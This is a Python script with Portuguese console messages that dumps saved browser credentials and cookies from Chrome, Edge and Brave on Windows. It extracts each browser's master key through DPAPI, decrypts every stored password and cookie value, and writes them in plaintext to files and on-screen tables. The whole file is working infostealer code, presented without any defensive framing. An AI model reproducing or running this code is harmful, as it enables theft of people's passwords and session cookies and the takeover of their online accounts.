import os
import json
import base64
import sqlite3
import shutil
import win32crypt
from Crypto.Cipher import AES
from datetime import datetime
from rich.console import Console
from rich.table import Table
from rich.progress import track

# Initialize Rich console for enhanced visual output
console = Console()

BROWSER_PATHS = {
    "Chrome": os.path.expandvars(r"%LOCALAPPDATA%\\Google\\Chrome\\User Data"),
    "Edge": os.path.expandvars(r"%LOCALAPPDATA%\\Microsoft\\Edge\\User Data"),
    "Brave": os.path.expandvars(r"%LOCALAPPDATA%\\BraveSoftware\\Brave-Browser\\User Data"),
}

TARGET_FILES = {
    "cookies": "Network\\Cookies",
    "logins": "Login Data"
}

def get_master_key(browser_path):
    try:
        with open(os.path.join(browser_path, "Local State"), "r", encoding="utf-8") as f:
            local_state = json.load(f)
        encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
        return win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
    except Exception as e:
        console.print(f"[red][ERRO] Falha ao obter chave do {browser_path}: {e}[/red]")
        return None

def decrypt_data(buff, master_key):
    try:
        if buff.startswith(b'v10'):
            iv = buff[3:15]
            payload = buff[15:]
            cipher = AES.new(master_key, AES.MODE_GCM, iv)
            return cipher.decrypt(payload)[:-16].decode('utf-8', errors='ignore')
        return "UNKNOWN_FORMAT"
    except Exception:
        return "DECRYPT_ERROR"

def dump_credentials(browser, profile="Default"):
    browser_path = os.path.join(BROWSER_PATHS[browser], profile)
    master_key = get_master_key(BROWSER_PATHS[browser])
    if not master_key:
        return []

    login_data_path = os.path.join(browser_path, TARGET_FILES["logins"])
    tmp_login = "tmp_login.db"
    shutil.copy2(login_data_path, tmp_login)

    conn = sqlite3.connect(tmp_login)
    cursor = conn.cursor()
    cursor.execute("SELECT origin_url, username_value, password_value FROM logins")

    results = []
    for url, username, password in track(cursor.fetchall(), description=f"Decrypting logins for {browser}"):
        decrypted = decrypt_data(password, master_key)
        results.append((url, username or "-", decrypted))

    conn.close()
    os.remove(tmp_login)
    return results

def dump_cookies(browser, profile="Default"):
    browser_path = os.path.join(BROWSER_PATHS[browser], profile)
    master_key = get_master_key(BROWSER_PATHS[browser])
    if not master_key:
        return []

    cookie_db_path = os.path.join(browser_path, TARGET_FILES["cookies"])
    tmp_cookie = "tmp_cookie.db"
    shutil.copy2(cookie_db_path, tmp_cookie)

    conn = sqlite3.connect(tmp_cookie)
    cursor = conn.cursor()
    cursor.execute("SELECT host_key, name, encrypted_value FROM cookies")

    cookies = []
    for host, name, value in track(cursor.fetchall(), description=f"Decrypting cookies for {browser}"):
        decrypted = decrypt_data(value, master_key)
        cookies.append((host, name, decrypted))

    conn.close()
    os.remove(tmp_cookie)
    return cookies

def save_results(filename, data):
    with open(filename, "w", encoding="utf-8") as f:
        for row in data:
            f.write(" | ".join(row) + "\n")

def main():
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    output_dir = f"browser_dumps_{timestamp}"
    os.makedirs(output_dir, exist_ok=True)

    for browser in BROWSER_PATHS:
        try:
            console.rule(f"Dumping {browser}")
            # Dump credentials
            console.print(f"[bold]Credenciais - {browser}[/bold]")
            creds = dump_credentials(browser)
            save_results(os.path.join(output_dir, f"{browser}_credentials.txt"), creds)
            console.print(f"[green]✔ {len(creds)} credenciais salvas em {output_dir}/{browser}_credentials.txt[/green]")

            # Preview credentials
            if creds:
                table = Table(show_header=True, header_style="bold cyan")
                table.add_column("URL", overflow="fold")
                table.add_column("Usuário")
                table.add_column("Senha")
                for url, user, pwd in creds:
                    table.add_row(url, user, pwd)
                console.print(table)

            # Dump cookies
            console.print(f"[bold]Cookies - {browser}[/bold]")
            cookies = dump_cookies(browser)
            save_results(os.path.join(output_dir, f"{browser}_cookies.txt"), cookies)
            console.print(f"[green]✔ {len(cookies)} cookies salvos em {output_dir}/{browser}_cookies.txt[/green]")

            # Preview cookies
            if cookies:
                table = Table(show_header=True, header_style="bold magenta")
                table.add_column("Host", overflow="fold")
                table.add_column("Nome")
                table.add_column("Valor")
                for host, name, val in cookies:
                    table.add_row(host, name, val)
                console.print(table)

        except Exception as e:
            console.print(f"[red][ERRO] {browser}: {e}[/red]")

    console.rule("Concluído")

if __name__ == "__main__":
    main()